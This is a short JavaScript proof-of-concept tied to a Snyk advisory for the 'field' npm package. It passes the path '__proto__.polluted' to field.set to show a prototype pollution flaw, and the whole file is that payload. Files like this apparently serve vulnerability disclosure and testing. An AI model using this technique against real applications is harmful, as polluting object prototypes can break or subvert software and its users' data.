//https://snyk.io/vuln/SNYK-JS-FIELD-1039884
 
   

  const field = require("field");
  const obj = {};
  field.set(obj, "__proto__.polluted", "yes");
// End of file
